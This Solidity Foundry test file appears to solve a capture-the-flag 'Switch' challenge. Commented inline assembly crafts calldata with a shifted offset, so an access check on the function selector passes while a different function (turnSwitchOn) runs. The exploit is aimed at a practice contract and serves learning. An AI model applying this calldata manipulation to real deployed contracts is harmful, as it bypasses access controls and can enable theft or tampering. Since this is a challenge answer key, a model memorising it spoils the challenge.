pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Switch.sol";

contract Attacktargetaritan is Test {
    Switch public target;

    function setUp() public {
        target = new Switch();
    }

    function testSoliditySwitch() public {
        /// data is encoded as bytes
        /// the calldata copy is structured as
        /// [selector][calldata]
        /// call data is a dynamic array so it is structured
        /// [selector][offset][length][content]
        ///    4        32      32       etc
        /// the function checks for the correct selector in the EXPECTED place
        /// but we can hack this by changing the offset to point to an unexpected place
        /// past the checked selector

        assembly {
            // load the ptr
            let ptr := mload(0x40)
            let dataLen := 0x0

            // target.flipSwitch(_data);
            // we need this to call the function
            mstore(ptr, shl(0xe0, 0x30c13ade))
            ptr := add(ptr, 0x4)
            dataLen := add(dataLen, 0x4)

            // data offset -
            // the modifier checks the selector that would be expected
            // in the first 4 bytes after data length in the bytes memory param
            // but it doesn't check the offset
            // so our offset needs to point PAST the turnSwitchOff selector
            // so we are not starting at 0x20, as would be expected
            // we are at 0x20 + 0x20 + 0x04 = 0x44
            mstore(ptr, 0x44)
            ptr := add(ptr, 0x20)
            dataLen := add(dataLen, 0x20)

            // length - 4 bytes: this is the length of our data
            // we don't actually need this as it will be skipped
            // but below is how the expected code would look
            mstore(ptr, 0x4)
            // takes up a full slot of 32 bytes to store the length
            ptr := add(ptr, 0x20)
            dataLen := add(dataLen, 0x20)

            // data == selector - turnSwitchOff
            // this is checked by the modifier
            mstore(ptr, shl(0xe0, 0x20606e15))
            ptr := add(ptr, 0x4)
            dataLen := add(dataLen, 0x4)

            // Now we are at the location where the offset is actually pointing to
            // store the length - 4 bytes (selector)
            mstore(ptr, 0x4)
            // takes up a full slot of 32 bytes to store the length
            ptr := add(ptr, 0x20)
            dataLen := add(dataLen, 0x20)

            // turnSwitchOn()
            mstore(ptr, shl(0xe0, 0x76227e12))
            ptr := add(ptr, 0x4)
            dataLen := add(dataLen, 0x4)

            // call it:
            let success := call(
                gas(),
                sload(target.slot),
                0,
                sub(ptr, dataLen),
                dataLen,
                0,
                0
            )

            if eq(success, 0) {
                revert(0, 0)
            }
        }
        assertEq(target.switchOn(), true);
    }
}
